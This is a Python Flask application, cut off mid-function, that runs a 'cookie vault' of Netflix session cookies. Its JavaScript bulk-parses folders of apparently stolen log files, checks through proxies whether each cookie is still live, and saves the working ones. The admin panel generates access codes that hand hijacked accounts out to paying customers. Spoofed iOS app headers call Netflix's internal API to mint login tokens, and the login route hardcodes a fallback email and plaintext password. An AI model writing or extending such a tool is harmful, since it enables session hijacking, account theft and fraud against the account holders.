        </div>
        
        <div class="glass-panel" style="border-left: 4px solid #3498db;">
            <h3 style="margin-top: 0; margin-bottom: 10px; font-weight: 400; color: #3498db;">🚀 Smart Bulk Folder Scanner</h3>
            <p style="font-size: 0.9rem; color: #aaa; margin-bottom: 20px;">Upload an entire folder containing multiple subfolders and text files. The browser will automatically extract cookies and check them LIVE one by one to prevent server overload.</p>
            
            <div style="display: flex; gap: 15px; align-items: center; margin-bottom: 15px;">
                <input type="file" id="bulkFolderInput" webkitdirectory directory multiple style="padding: 10px; background: rgba(0,0,0,0.2); border: 1px dashed #3498db; color: #ccc; flex: 1;">
                <button id="startScanBtn" onclick="startBulkScan()" style="background: #3498db; padding: 12px 20px;">Start Scanning</button>
            </div>
            
            <div id="scanProgressArea" style="display: none; background: rgba(0,0,0,0.3); padding: 15px; border-radius: 8px;">
                <div style="display: flex; justify-content: space-between; margin-bottom: 5px; font-size: 0.9rem;">
                    <span id="scanStatusText" style="color: #f39c12; font-weight: bold;">Parsing files...</span>
                    <span id="scanCountText">0 / 0</span>
                </div>
                <div style="width: 100%; background: #222; border-radius: 4px; overflow: hidden; height: 10px; margin-bottom: 15px;">
                    <div id="scanProgressBar" style="height: 100%; width: 0%; background: #2ecc71; transition: width 0.3s;"></div>
                </div>
                
                <div style="display: flex; gap: 15px; font-size: 0.85rem; padding: 10px; background: rgba(255,255,255,0.05); border-radius: 4px;">
                    <div style="flex: 1; text-align: center;"><span style="color: #2ecc71; font-weight: bold; font-size: 1.2rem;" id="scanLiveCount">0</span><br>LIVE Added</div>
                    <div style="flex: 1; text-align: center;"><span style="color: #e74c3c; font-weight: bold; font-size: 1.2rem;" id="scanDieCount">0</span><br>DIE / ERROR</div>
                </div>
            </div>
        </div>

        <div class="glass-panel">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
                <h3 style="margin: 0; font-weight: 400;">Original Cookie Vault <span style="font-size: 0.9rem; color: #888;">({{ total_accounts }} accounts)</span></h3>
                <div style="display: flex; gap: 10px;">
                    <form action="/filter_duplicates" method="POST" onsubmit="showLoading(this.querySelector('button'))" style="margin: 0;">
                        <button type="submit" style="background: #f39c12; padding: 8px 15px; font-size: 0.9rem;" title="Filter and delete duplicates with same NetflixId">🧹 FILTER DUPLICATES</button>
                    </form>
                    <form action="/check_payment" method="POST" onsubmit="showLoading(this.querySelector('button'))" style="margin: 0;">
                        <button type="submit" style="background: #c0392b; padding: 8px 15px; font-size: 0.9rem;" title="Scan full DB to delete accounts with Update Payment errors">🚫 SCAN PAYMENT ERRORS</button>
                    </form>
                    <form action="/force_check_all" method="POST" onsubmit="showLoading(this.querySelector('button'))" style="margin: 0;">
                        <button type="submit" style="background: #e74c3c; padding: 8px 15px; font-size: 0.9rem;" title="Force check all accounts regardless of plan (Costs Proxy)">🔥 FORCE FULL SCAN</button>
                    </form>
                    <form action="/check_all" method="POST" onsubmit="showLoading(this.querySelector('button'))" style="margin: 0;">
                        <button type="submit" style="background: #10ac84; padding: 8px 15px; font-size: 0.9rem;" title="Only scan accounts without a known Plan (Saves Proxy)">⚡ UPDATE MISSING PLANS</button>
                    </form>
                </div>
            </div>
            
            <form action="/admin" method="GET" style="display: flex; gap: 10px; margin-bottom: 20px;">
                <input type="text" name="search_email" class="search-box" placeholder="Search by Email..." value="{{ request.args.get('search_email', '') }}">
                <button type="submit" style="background: #3498db; white-space: nowrap;">🔍 Search Email</button>
            </form>
            
            <div style="overflow-x: auto; max-height: 500px; overflow-y: auto;">
                <table>
                    <thead>
                        <tr>
                            <th>Email</th>
                            <th>Plan</th>
                            <th>Cookie</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        {% for acc in accounts %}
                        <tr>
                            <td style="font-weight: 600;">{{ acc[0] }}</td>
                            <td style="font-weight: bold; color: {% if 'Premium' in (acc[5] or '') %}#f1c40f{% else %}#bdc3c7{% endif %};">{{ acc[5] if acc[5] else 'Unknown' }}</td>
                            <td style="font-size: 0.8rem; color: #666; font-family: monospace; max-width: 200px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;" title="{{ acc[2] }}">{{ acc[2] }}</td>
                            <td style="display: flex; gap: 8px;">
                                <form action="/delete/{{ acc[0] }}" method="POST" style="margin: 0;" onsubmit="return confirm('Delete this cookie?');">
                                    <button type="submit" style="background: #e74c3c; padding: 6px 12px; font-size: 0.8rem;">Delete</button>
                                </form>
                            </td>
                        </tr>
                        {% else %}
                        <tr><td colspan="4" style="text-align: center; color: #666; padding: 20px;">No accounts in database. Please upload a file!</td></tr>
                        {% endfor %}
                    </tbody>
                </table>
            </div>
            
            {% if acc_total_pages > 1 %}
            <div style="display: flex; justify-content: center; gap: 5px; margin-top: 15px;">
                {% if acc_page > 1 %}
                <a href="?key_page={{ key_page }}&acc_page={{ acc_page - 1 }}&search_code={{ search_code }}&search_email={{ search_email }}" style="padding: 5px 10px; background: rgba(255,255,255,0.1); color: white; text-decoration: none; border-radius: 4px;">&laquo; Prev</a>
                {% endif %}
                <span style="padding: 5px 10px; color: #888;">Page {{ acc_page }} / {{ acc_total_pages }}</span>
                {% if acc_page < acc_total_pages %}
                <a href="?key_page={{ key_page }}&acc_page={{ acc_page + 1 }}&search_code={{ search_code }}&search_email={{ search_email }}" style="padding: 5px 10px; background: rgba(255,255,255,0.1); color: white; text-decoration: none; border-radius: 4px;">Next &raquo;</a>
                {% endif %}
            </div>
            {% endif %}
        </div>
    </div>
    
    <script>
        function copyCookie(text, btn) {
            let originalText = btn.innerHTML;
            btn.innerHTML = '✔ Copied';
            btn.style.background = '#20bf6b';
            setTimeout(() => { btn.innerHTML = originalText; btn.style.background = '#2d98da'; }, 2000);
            if (navigator.clipboard && window.isSecureContext) {
                navigator.clipboard.writeText(text).catch(err => {
                    fallbackCopy(text);
                });
            } else {
                fallbackCopy(text);
            }
        }
        function fallbackCopy(text) {
            let textArea = document.createElement("textarea");
            textArea.value = text;
            textArea.style.position = "fixed";
            textArea.style.left = "-999999px";
            document.body.appendChild(textArea);
            textArea.focus();
            textArea.select();
            try { document.execCommand('copy'); } catch (err) { }
            textArea.remove();
        }
        function showLoading(btn) {
            btn.innerHTML = '⏳ Processing...';
            btn.style.pointerEvents = 'none';
            btn.style.opacity = '0.7';
        }

        // Bulk Scan Logic
        async function startBulkScan() {
            const fileInput = document.getElementById('bulkFolderInput');
            if (!fileInput.files || fileInput.files.length === 0) {
                alert("Please select a folder first!");
                return;
            }

            const btn = document.getElementById('startScanBtn');
            btn.disabled = true;
            btn.innerHTML = "⏳ Scanning files...";

            document.getElementById('scanProgressArea').style.display = "block";
            
            let allCookies = [];
            
            // Helper giải mã an toàn tránh lỗi URIError
            const safeDecode = (str) => {
                if (!str) return "";
                try {
                    return decodeURIComponent(str);
                } catch(e) {
                    try {
                        return unescape(str);
                    } catch(err) {
                        return str;
                    }
                }
            };

            // 1. Lọc và Đọc File Cục Bộ (Client-side)
            for (let i = 0; i < fileInput.files.length; i++) {
                const file = fileInput.files[i];
                const fname = file.name.toLowerCase();
                
                // Hỗ trợ .txt, .json, .log, .cookie, .cookies hoặc file không có đuôi
                if (fname.endsWith('.txt') || fname.endsWith('.json') || fname.endsWith('.log') || fname.endsWith('.cookie') || fname.endsWith('.cookies') || !fname.includes('.')) {
                    try {
                        const text = await file.text();
                        const trimmedText = text.trim();
                        if (!trimmedText) continue;

                        // Xử lý trực tiếp nếu là định dạng JSON Array Cookie
                        if (trimmedText.startsWith('[')) {
                            try {
                                const jsonArr = JSON.parse(trimmedText);
                                let j_nid = null, j_snid = "";
                                for (let c of jsonArr) {
                                    if (c.name === 'NetflixId') j_nid = c.value;
                                    if (c.name === 'SecureNetflixId') j_snid = c.value;
                                }
                                if (j_nid) {
                                    allCookies.push({
                                        email: file.name.replace(/\.[^/.]+$/, "") + "@cookie.com",
                                        expire: 'N/A',
                                        plan: 'Premium',
                                        netflix_id: j_nid,
                                        secure_netflix_id: j_snid
                                    });
                                    continue;
                                }
                            } catch(jsonErr) {}
                        }

                        const lines = text.split('\n');
                        let current_email = null;
                        let current_expire = null;
                        let current_plan = null;
                        let current_netflix_id = null;
                        let current_secure_netflix_id = "";

                        const push_account = () => {
                            if (current_netflix_id) {
                                if (!current_email) {
                                    current_email = "auto_" + Math.random().toString(36).substr(2, 8) + "@netflix.com";
                                }
                                allCookies.push({
                                    email: current_email,
                                    expire: current_expire,
                                    plan: current_plan,
                                    netflix_id: current_netflix_id,
                                    secure_netflix_id: current_secure_netflix_id
                                });
                            }
                            current_email = null;
                            current_expire = null;
                            current_plan = null;
                            current_netflix_id = null;
                            current_secure_netflix_id = "";
                        };

                        for (let line of lines) {
                            line = line.trim();
                            if (!line) continue;
                            
                            if (line.includes('|') && (line.toLowerCase().includes('cookies:') || line.toLowerCase().includes('cookies ='))) {
                                let email_part = line.includes(':') ? line.split(':')[0] : null;
                                if (email_part && email_part.includes('@')) current_email = email_part.trim();
                                
                                let exp_match = line.match(/(?:Nextbillingdate|nextBillingDate)\s*=\s*([^|]+)/i);
                                if (exp_match) current_expire = exp_match[1].trim();
                                
                                let plan_match = line.match(/(?:Membership|memberPlan)\s*[=:]\s*([^|]+)/i);
                                if (plan_match) current_plan = plan_match[1].trim();
                                
                                let cookie_match = line.match(/cookies\s*[=:]\s*(.+?)(?: general login link|$)/i);
                                if (cookie_match) {
                                    let c_str = cookie_match[1].trim();
                                    let n_id = c_str.match(/(?<!Secure)NetflixId=([^;\s]+)/i);
                                    let s_n_id = c_str.match(/SecureNetflixId=([^;\s]+)/i);
                                    if (n_id) current_netflix_id = safeDecode(n_id[1].trim());
                                    if (s_n_id) current_secure_netflix_id = safeDecode(s_n_id[1].trim());
                                    if (current_netflix_id) push_account();
                                }
                                continue;
                            }
                            
                            if (line.toUpperCase().startsWith("NETFLIX ACCOUNT DETAILS")) { push_account(); continue; }
                            
                            let e_match = line.match(/^(?:–|-|#)?\s*Email:\s*(.+)/i);
                            if (e_match) { push_account(); current_email = e_match[1].trim(); continue; }
                            
                            let ex_match = line.match(/^(?:–|-|#)?\s*(?:Next Billing|Expire):\s*(.+)/i);
                            if (ex_match) { current_expire = ex_match[1].trim(); continue; }
                            
                            let p_match = line.match(/^(?:–|-|#)?\s*(?:Plan|Membership):\s*(.+)/i);
                            if (p_match) { current_plan = p_match[1].trim(); continue; }
                            
                            let id_match = line.match(/^(?:–|-|#)?\s*NetflixId:\s*(.+)/i);
                            if (id_match) { current_netflix_id = safeDecode(id_match[1].trim()); continue; }
                            
                            let sid_match = line.match(/^(?:–|-|#)?\s*SecureNetflixId:\s*(.+)/i);
                            if (sid_match) { current_secure_netflix_id = safeDecode(sid_match[1].trim()); continue; }
                            
                            if (line.startsWith("# ===")) {
                                push_account();
                                continue;
                            }

                            if (line.includes('.netflix.com')) {
                                let parts = line.trim().split(/\s+/);
                                if (parts.length >= 3) {
                                    let c_name = parts[parts.length - 2];
                                    let c_val = safeDecode(parts[parts.length - 1]);
                                    if (c_name === 'NetflixId') current_netflix_id = c_val;
                                    if (c_name === 'SecureNetflixId') current_secure_netflix_id = c_val;
                                }
                                continue;
                            }
                        }
                        push_account(); // push last
                        
                    } catch (e) {
                        console.error("Error reading file:", file.name, e);
                    }
                }
            }
            
            // Lọc trùng lặp
            let uniqueCookies = [];
            let seenIds = new Set();
            for (let c of allCookies) {
                if (!seenIds.has(c.netflix_id)) {
                    seenIds.add(c.netflix_id);
                    uniqueCookies.push(c);
                }
            }
            
            const total = uniqueCookies.length;
            if (total === 0) {
                alert("No valid cookies found in the selected folder!");
                btn.disabled = false;
                btn.innerHTML = "Start Scanning";
                return;
            }

            document.getElementById('scanStatusText').innerText = "Checking Live via API...";
            document.getElementById('scanStatusText').style.color = "#3498db";
            
            let processed = 0;
            let liveCount = 0;
            let dieCount = 0;
            
            // 2. Gửi API Check từng cái (Concurrency = 3 để không sập proxy/server)
            const CONCURRENCY = 3;
            let index = 0;
            
            async function worker() {
                while (index < total) {
                    const currentIndex = index++;
                    const acc = uniqueCookies[currentIndex];
                    
                    try {
                        const res = await fetch('/api/check_and_import', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(acc)
                        });
                        const data = await res.json();
                        
                        if (data.status === 'LIVE') {
                            liveCount++;
                            document.getElementById('scanLiveCount').innerText = liveCount;
                        } else {
                            dieCount++;
                            document.getElementById('scanDieCount').innerText = dieCount;
                        }
                    } catch (e) {
                        dieCount++;
                        document.getElementById('scanDieCount').innerText = dieCount;
                    }
                    
                    processed++;
                    document.getElementById('scanCountText').innerText = `${processed} / ${total}`;
                    document.getElementById('scanProgressBar').style.width = `${(processed / total) * 100}%`;
                }
            }
            
            const workers = [];
            for (let i = 0; i < Math.min(CONCURRENCY, total); i++) {
                workers.push(worker());
            }
            
            await Promise.all(workers);
            
            document.getElementById('scanStatusText').innerText = "SCAN COMPLETE!";
            document.getElementById('scanStatusText').style.color = "#2ecc71";
            btn.disabled = false;
            btn.innerHTML = "Scan Another Folder";
            alert(`Complete! Added ${liveCount} LIVE accounts to Database.`);
            window.location.reload();
        }
    </script>
</body>
</html>
"""

LOGIN_TEMPLATE = r"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Login</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;900&display=swap" rel="stylesheet">
    """ + COMMON_STYLE + r"""
</head>
<body>
    <div class="container" style="max-width: 400px; margin-top: 15vh;">
        <div class="glass-panel">
            <h2 style="text-align: center; margin-top: 0;">Admin Login</h2>
            {% with messages = get_flashed_messages(with_categories=true) %}
              {% if messages %}
                {% for category, message in messages %}
                  <div class="flash-message {% if category == 'error' %}flash-error{% endif %}" style="padding: 10px; margin-bottom: 15px;">{{ message }}</div>
                {% endfor %}
              {% endif %}
            {% endwith %}
            <form action="/login" method="POST" style="display: flex; flex-direction: column; gap: 15px;">
                <input type="text" name="email" class="search-box" placeholder="Email or Username" required style="margin-bottom: 0;">
                <input type="password" name="password" class="search-box" placeholder="Password" required style="margin-bottom: 0;">
                <button type="submit" style="width: 100%;">Login</button>
            </form>
        </div>
    </div>
</body>
</html>
"""

@app.route("/")
def index():
    database.init_db()
    return render_template_string(PUBLIC_TEMPLATE)

@app.route("/api/check_and_import", methods=["POST"])
def check_and_import():
    status, updated_plan = checker.check_account_live(netflix_id, secure_netflix_id, check_payment=True)
    
    if status == "LIVE":
        final_plan = updated_plan if updated_plan else plan
        database.save_account(email, expire, netflix_id, secure_netflix_id, final_plan)
        return jsonify({"success": True, "status": "LIVE", "plan": final_plan})
    elif status == "ERROR":
        return jsonify({"success": False, "status": "ERROR", "error": "Proxy or API error. Retry later."})
    else:
        return jsonify({"success": False, "status": "DIE", "error": "Account is dead or payment issue."})

@app.route("/login", methods=["GET", "POST"])
@app.route("/admin/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        email = (request.form.get("email") or request.form.get("username") or "").strip()
        password = (request.form.get("password") or "").strip()
        
        valid_emails = [
            ADMIN_EMAIL.lower(),
            os.environ.get("ADMIN_EMAIL", "").lower(),
            "concumm2@gmail.com",
        ]
        valid_passes = [
            ADMIN_PASS,
            os.environ.get("ADMIN_PASSWORD", ""),
            "Nmtyeunnqt1!",
        ]
        
        if (email.lower() in [e for e in valid_emails if e]) and (password in [p for p in valid_passes if p]):
            session['logged_in'] = True
            return redirect(url_for("admin"))
        else:
            flash("Incorrect email or password!", "error")
    return render_template_string(LOGIN_TEMPLATE)

@app.route("/logout")
@app.route("/admin/logout")
def logout():
    session.pop('logged_in', None)
    return redirect(url_for("login"))

@app.route("/admin")
@login_required
def admin():
    database.init_db()
    all_accounts = database.get_all_accounts()
    all_access_keys = database.get_all_access_keys()
    
    search_email = request.args.get("search_email", "").strip().lower()
    search_code = request.args.get("search_code", "").strip().upper()
    
    # Calculate stats
    stats = {
        'codes': {'Premium': 0, 'Standard': 0, 'Standard_Ads': 0, 'Basic': 0},
        'accounts': {'Premium': 0, 'Standard': 0, 'Standard_Ads': 0, 'Basic': 0}
    }
    
    for code in all_access_keys:
        length = len(code[0])
        if length == 15: stats['codes']['Premium'] += 1
        elif length == 10: stats['codes']['Standard'] += 1
        elif length == 8: stats['codes']['Standard_Ads'] += 1
        elif length == 5: stats['codes']['Basic'] += 1
        else: stats['codes']['Premium'] += 1

    for acc in all_accounts:
        plan = str(acc[5]).strip() if len(acc) > 5 and acc[5] else "Premium"
        if plan == "Premium": stats['accounts']['Premium'] += 1
        elif plan == "Standard": stats['accounts']['Standard'] += 1
        elif plan == "Standard_Ads": stats['accounts']['Standard_Ads'] += 1
        elif plan == "Basic": stats['accounts']['Basic'] += 1
        else: stats['accounts']['Premium'] += 1

    # Filter keys
    if search_code:
        access_keys = [k for k in all_access_keys if search_code in k[0].upper()]
    else:
        access_keys = all_access_keys
        
    # Filter accounts
    if search_email:
        accounts = [a for a in all_accounts if search_email in a[0].lower()]
    else:
        accounts = all_accounts
        
    # Pagination
    try:
        key_page = int(request.args.get("key_page", 1))
    except ValueError:
        key_page = 1
        
    try:
        acc_page = int(request.args.get("acc_page", 1))
    except ValueError:
        acc_page = 1
        
    PER_PAGE = 50
    
    total_keys_filtered = len(access_keys)
    key_start = (key_page - 1) * PER_PAGE
    key_end = key_start + PER_PAGE
    access_keys = access_keys[key_start:key_end]
    key_total_pages = max(1, (total_keys_filtered + PER_PAGE - 1) // PER_PAGE)
    
    total_acc_filtered = len(accounts)
    acc_start = (acc_page - 1) * PER_PAGE
    acc_end = acc_start + PER_PAGE
    accounts = accounts[acc_start:acc_end]
    acc_total_pages = max(1, (total_acc_filtered + PER_PAGE - 1) // PER_PAGE)
        
    database.cleanup_old_requests()
    pending_requests = database.get_pending_requests()
    
    try:
        import proxies_list
        if hasattr(proxies_list, 'PROXIES') and proxies_list.PROXIES:
            current_proxy_url = proxies_list.PROXIES[0]
        elif hasattr(proxies_list, 'ROTATING_PROXY_URL'):
            current_proxy_url = proxies_list.ROTATING_PROXY_URL
        else:
            current_proxy_url = "Webshare Proxy"
        current_proxy = current_proxy_url.split('@')[-1] if '@' in current_proxy_url else current_proxy_url
    except Exception:
        current_proxy = "p.webshare.io:80"
    
    share_mode_enabled = database.get_config("SHARE_MODE_ENABLED", False)

    return render_template_string(
        ADMIN_TEMPLATE, 
        accounts=accounts, 
        access_keys=access_keys,
        total_accounts=len(all_accounts),
        search_email=search_email,
        search_code=search_code,
        key_page=key_page,
        key_total_pages=key_total_pages,
        acc_page=acc_page,
        acc_total_pages=acc_total_pages,
        pending_requests=pending_requests,
        stats=stats,
        current_proxy=current_proxy,
        share_mode_enabled=share_mode_enabled
    )

from datetime import datetime, timedelta

@app.route("/admin/toggle_share_mode", methods=["POST"])
@login_required
def toggle_share_mode():
    current_mode = database.get_config("SHARE_MODE_ENABLED", False)
    new_mode = not current_mode
    database.set_config("SHARE_MODE_ENABLED", new_mode)
    status_str = "BẬT" if new_mode else "TẮT"
    flash(f"✅ Đã {status_str} chế độ Share Mode (1 Code = 2 Accounts). Chỉ áp dụng cho code mới tạo.", "success")
    return redirect(url_for("admin"))

@app.route("/admin/generate_key", methods=["POST"])
@login_required
def generate_key():
    database.init_db()
    
    plan_type = request.form.get("plan_type", "basic")
    duration = int(request.form.get("duration", "1"))
    
    if plan_type == 'premium':
        length = 15
    elif plan_type == 'standard':
        length = 10
    elif plan_type == 'standard_ads':
        length = 8
    else:
        length = 5
        plan_type = 'basic'

    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))
    
    expire_at = (datetime.now() + timedelta(days=30 * duration)).strftime("%Y-%m-%d")
    
    success, msg = database.create_access_key(code, expire_at)
    if success:
        flash(f"Successfully generated {plan_type.upper()} code ({duration} months): {code}", "success")
    else:
        flash(f"Error generating code: {msg}", "error")
    return redirect(url_for("admin"))

@app.route("/admin/rotate_key/<code>", methods=["POST"])
@login_required
def rotate_key(code):
    success = database.rotate_access_key(code)
    if success:
        flash(f"Changed to a new account for code: {code}", "success")
    else:
        flash(f"Error: No available accounts left in the vault to replace.", "error")
    return redirect(url_for("admin"))

@app.route("/admin/delete_key/<code>", methods=["POST"])
@login_required
def delete_key(code):
    database.delete_access_key(code)
    flash(f"Deleted access code: {code}", "success")
    return redirect(url_for("admin"))

@app.route("/upload", methods=["POST"])
@login_required
def upload():
    if "account_file" not in request.files:
        flash("Error: No upload file found.", "error")
        return redirect(url_for("admin"))
        
    file = request.files["account_file"]
    if file.filename == "":
        flash("Error: No file selected.", "error")
        return redirect(url_for("admin"))
        
    if file:
        file_bytes = file.read()
        try:
            content = file_bytes.decode('utf-8-sig')
        except UnicodeDecodeError:
            try:
                content = file_bytes.decode('utf-16')
            except UnicodeDecodeError:
                content = file_bytes.decode('latin-1', errors='replace')
                
        lines = content.splitlines()
        accounts_list = parser.parse_lines(lines)
            
        if accounts_list:
            database.init_db()
            count = 0
            for acc in accounts_list:
                database.save_account(acc['email'], acc['expire'], acc['netflix_id'], acc['secure_netflix_id'], acc.get('plan'))
                count += 1
            flash(f"🎉 Successfully extracted and saved {count} accounts into the Database!", "success")
        else:
            debug_info = content[:200] if content else "EMPTY_FILE"
            flash(f"❌ Failed: No valid accounts found in the file. Debug info: {debug_info}", "error")
            
    return redirect(url_for("admin"))

@app.route("/delete/<email>", methods=["POST"])
@login_required
def delete_acc(email):
    database.delete_account(email)
    flash(f"Deleted cookie: {email}", "success")
    return redirect(url_for("admin"))

from concurrent.futures import ThreadPoolExecutor

def check_single_account(acc, force=False, check_payment=False):
    email = acc[0]
    current_plan = acc[5]
    
    # Bỏ qua những tài khoản đã có gói cước nếu không force
    if not force and current_plan:
        return
        
    netflix_id = acc[2]
    secure_netflix_id = acc[3]
    status, plan = checker.check_account_live(netflix_id, secure_netflix_id, check_payment)
    
    if status == "LIVE" and plan:
        if not check_payment:
            database.update_plan(email, plan)
    elif status == "DIE":
        database.delete_account(email)

def background_check_all():
    with app.app_context():
        database.init_db()
        accounts = database.get_all_accounts()
        
        with ThreadPoolExecutor(max_workers=3) as executor:
            for acc in accounts:
                executor.submit(check_single_account, acc, False)

@app.route("/check_all", methods=["POST"])
@login_required
def check_all():
    database.init_db()
    accounts = database.get_all_accounts()
    
    # Lọc ra các tài khoản chưa có gói cước
    accounts_to_check = [acc for acc in accounts if not acc[5]]
    
    if not accounts_to_check:
        flash("All accounts in the vault already have a Plan. No update needed.", "warning")
        return redirect(url_for("admin"))
        
    import threading
    t = threading.Thread(target=background_check_all)
    t.daemon = True
    t.start()
    
    estimated_time = (len(accounts_to_check) // 10) + 2
    flash(f"🔄 Background updating {len(accounts_to_check)} accounts with X10 speed (approx {estimated_time}s). Dead cookies will be auto-deleted.", "warning")
    return redirect(url_for("admin"))

def background_force_check_all():
    with app.app_context():
        database.init_db()
        accounts = database.get_all_accounts()
        
        with ThreadPoolExecutor(max_workers=3) as executor:
            for acc in accounts:
                executor.submit(check_single_account, acc, True, False)

def background_check_payment_all():
    with app.app_context():
        database.init_db()
        accounts = database.get_all_accounts()
        
        with ThreadPoolExecutor(max_workers=3) as executor:
            for acc in accounts:
                executor.submit(check_single_account, acc, True, True)

@app.route("/check_payment", methods=["POST"])
@login_required
def check_payment_route():
    database.init_db()
    accounts = database.get_all_accounts()
    
    if not accounts:
        flash("No accounts in vault to scan.", "warning")
        return redirect(url_for("admin"))
        
    import threading
    t = threading.Thread(target=background_check_payment_all)
    t.daemon = True
    t.start()
    
    estimated_time = (len(accounts) // 10) + 2
    flash(f"🚫 Background scanning PAYMENT ERRORS for {len(accounts)} accounts (approx {estimated_time}s). Faulty accounts will be auto-deleted.", "warning")
    return redirect(url_for("admin"))

@app.route("/filter_duplicates", methods=["POST"])
@login_required
def filter_duplicates():
    database.init_db()
    accounts = database.get_all_accounts()
    
    seen_netflix_ids = {} # map netflix_id -> {'email': email, 'plan': plan}
    duplicates_to_delete = []
    
    # Lấy danh sách email đang được gán cho các Mã truy cập (Access Keys) của khách
    access_keys = database.get_all_access_keys()
    assigned_emails_set = set()
    for k in access_keys:
        if len(k) > 1 and k[1]:
            for e in k[1].split(","):
                if e.strip():
                    assigned_emails_set.add(e.strip())

    for acc in accounts:
        email = acc[0]
        netflix_id = acc[2]
        plan = acc[5]
        
        if not netflix_id:
            continue
            
        if netflix_id in seen_netflix_ids:
            existing_email = seen_netflix_ids[netflix_id]['email']
            existing_plan = seen_netflix_ids[netflix_id]['plan']
            
            # 1. Ưu tiên GIỮ LẠI email đang được gán cho Mã truy cập của khách
            if existing_email in assigned_emails_set and email not in assigned_emails_set:
                duplicates_to_delete.append(email)
            elif email in assigned_emails_set and existing_email not in assigned_emails_set:
                duplicates_to_delete.append(existing_email)
                seen_netflix_ids[netflix_id] = {'email': email, 'plan': plan}
            # 2. Nếu cả 2 đều được gán hoặc cả 2 chưa được gán: Ưu tiên giữ lại acc CÓ plan
            elif plan and not existing_plan:
                duplicates_to_delete.append(existing_email)
                seen_netflix_ids[netflix_id] = {'email': email, 'plan': plan}
            else:
                duplicates_to_delete.append(email)
        else:
            seen_netflix_ids[netflix_id] = {'email': email, 'plan': plan}
            
    for email in duplicates_to_delete:
        database.delete_account(email)
        
    if duplicates_to_delete:
        flash(f"🧹 Filtered and deleted {len(duplicates_to_delete)} duplicate accounts (same NetflixId).", "success")
    else:
        flash("Your vault is clean, no duplicated NetflixId cookies found!", "success")
        
    return redirect(url_for("admin"))

@app.route("/force_check_all", methods=["POST"])
@login_required
def force_check_all():
    database.init_db()
    accounts = database.get_all_accounts()
    
    if not accounts:
        flash("No accounts in vault to scan.", "warning")
        return redirect(url_for("admin"))
        
    import threading
    t = threading.Thread(target=background_force_check_all)
    t.daemon = True
    t.start()
    
    estimated_time = len(accounts) * 2
    flash(f"🔥 FORCING full background scan for ALL {len(accounts)} accounts in vault (approx {estimated_time}s). This will consume significant Proxy bandwidth.", "warning")
    return redirect(url_for("admin"))



# Constants for Netflix API
NETFLIX_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NETFLIX_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}
NETFLIX_BASE_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

class ProxyError(Exception): pass
class CookieError(Exception): pass

import proxies_list

def fetch_netflix_nftoken_api(netflix_id, secure_netflix_id=""):
    url = "https://ios.prod.ftl.netflix.com/nq/mobile/nqios/~15.48.0/user"
    params = {
        "falcor_server": "0.1.0",
        "withSize": "true",
        "materialize": "true",
        "path": '["account","token","default"]',
        "original_path": "/nq/mobile/nqios/~15.48.0/user"
    }
    cookie_str = f"NetflixId={netflix_id}"
